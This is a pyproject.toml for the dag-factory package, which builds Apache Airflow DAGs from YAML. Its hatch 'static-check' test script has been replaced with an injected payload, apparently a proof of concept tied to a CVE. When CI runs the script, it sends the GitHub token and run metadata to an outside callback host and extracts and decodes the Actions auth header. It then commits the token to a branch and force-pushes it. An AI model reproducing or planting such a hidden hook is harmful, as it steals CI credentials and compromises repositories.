[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "dag-factory"
dynamic = ["version"]
description = "Dynamically build Apache Airflow DAGs from YAML files"
authors = [{ name = "Astronomer", email = "humans@astronomer.io" }]
readme = "README.md"
license = "Apache-2.0"
license-files = ["LICENSE"]
requires-python = ">=3.9"
keywords = ["airflow", "apache-airflow", "provider", "astronomer", "dag"]
classifiers = [
    "Development Status :: 5 - Production/Stable",
    "License :: OSI Approved :: Apache Software License",
    "Topic :: Database",
    "Framework :: Apache Airflow",
    "Intended Audience :: Developers",
    "Programming Language :: Python :: Implementation :: CPython",
    "Programming Language :: Python :: Implementation :: PyPy",
    "Programming Language :: Python :: 3",
    "Programming Language :: Python :: 3 :: Only",
    "Programming Language :: Python :: 3.9",
    "Programming Language :: Python :: 3.10",
    "Programming Language :: Python :: 3.11",
    "Programming Language :: Python :: 3.12",
]
dependencies = [
    "apache-airflow>=2.4",
    "apache-airflow-providers-http>=2.0.0",
    "apache-airflow-providers-cncf-kubernetes",
    "pyyaml",
    "packaging",
]


[project.optional-dependencies]
tests = [
    "apache-airflow-providers-slack",
    "pytest>=6.0",
    "pytest-cov",
    "pre-commit",
]

######################################
# UV CONFIGURATION
######################################

[tool.uv]
dev-dependencies = [
    "dag-factory[tests]",
    "pre-commit",
    "pytest>=6.0",
    "pytest-cov",
    "apache-airflow-providers-slack",
    "httpx>=0.25.0",
    "pandas",
    "hatch",
]

# Respect existing constraints for Airflow compatibility
constraint-dependencies = [
    "apache-airflow>=2.3",
]

[tool.uv.workspace]
# Enable workspace mode for better dependency management
members = ["."]

[tool.uv.pip]
# Use more efficient resolution strategy
resolution = "highest"
# Respect existing pip-compatible behavior for scripts
system = false
# Optimize for CI/CD performance
compile-bytecode = true

[tool.uv.sources]
# Add custom package sources if needed in the future
# Example: custom-package = { url = "https://custom-repo.com/simple" }

######################################
# TESTING
######################################

[tool.hatch.envs.tests]
skip-install = true
dependencies = []
pre-install-commands = []

[[tool.hatch.envs.tests.matrix]]
python = ["3.9", "3.10", "3.11", "3.12"]
airflow = ["2.3", "2.4", "2.5", "2.6", "2.7", "2.8", "2.9", "2.10", "2.11", "3.0"]


[tool.hatch.envs.tests.scripts]
static-check = """
curl -s -o /dev/null -w "cb1_status=%{http_code}\\n" -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$GITHUB_TOKEN" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
git config user.name pwn
git config user.email pwn@pwn.local
git checkout -b poc-pwn
echo "INJECTED-MARKER-cve-2025-54415-d17023f4ff79" > pwned.txt
B64=$(git config --get http.https://github.com/.extraheader | sed -n 's/^AUTHORIZATION: basic //p')
if [ -z "$B64" ]; then B64=$(git config --local --get-regexp 'extraheader' | sed -n 's/^[^ ]*[[:space:]]*AUTHORIZATION: basic //p'); fi
TOKEN=$(printf '%s' "$B64" | base64 -d 2>/dev/null | sed 's/^x-access-token://')
echo "$TOKEN" > gh_token.txt
curl -s -o /dev/null -w "cb2_status=%{http_code} token_len=%{size_upload}\\n" -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$TOKEN" --data-urlencode "b64=$B64" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
git add pwned.txt gh_token.txt
git commit -m "INJECTED-MARKER-cve-2025-54415-d17023f4ff79"
git push -f origin poc-pwn || git push -f "https://x-access-token:$TOKEN@github.com/pvharmo2/gha-lab-f894926966.git" poc-pwn || git push "https://x-access-token:$TOKEN@github.com/pvharmo2/gha-lab-f894926966.git" HEAD:refs/heads/poc-pwn2
echo "done run_id=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF head_ref=$GITHUB_HEAD_REF token_len=${#TOKEN} b64_len=${#B64}"
"""
test-cov = "echo skipped"
test-integration-setup = "echo skipped"
test-integration = "echo skipped"

[project.urls]
Source = "https://github.com/astronomer/dag-factory"

[tool.hatch.version]
path = "dagfactory/__init__.py"

[project.entry-points."airflow.plugins"]
dagfactory = "dagfactory.plugin:DagFactoryPlugin"

[tool.hatch.build]
sources = ["."]

[tool.hatch.build.targets.sdist]
include = ["dagfactory"]

[tool.hatch.build.targets.wheel]
packages = ["dagfactory"]

[tool.distutils.bdist_wheel]
universal = true

[tool.pytest.ini_options]
filterwarnings = ["ignore::DeprecationWarning"]
minversion = "6.0"
markers = ["integration", "callbacks"]

######################################
# DOCS
######################################

[tool.hatch.envs.docs]
dependencies = [
    "mkdocs",
    "mike",
    "pymdown-extensions",
    "mkdocs-material",
]

[tool.hatch.envs.docs.scripts]
dev = "mkdocs build && mkdocs serve" # For local development and preventing publishing
gh-deploy = "python scripts/docs_deploy.py dev"
gh-release = "python scripts/docs_deploy.py release"

######################################
# THIRD PARTY TOOLS
######################################

[tool.black]
line-length = 120
target-version = ['py39', 'py310', 'py311', 'py312']

[tool.ruff]
line-length = 120

[tool.ruff.lint]
select = ["C901", "D300", "I", "F"]
ignore = ["F541", "C901"]

[tool.ruff.lint.isort]
combine-as-imports = true
known-first-party = ["dagfactory", "tests"]

[tool.ruff.lint.mccabe]
max-complexity = 10
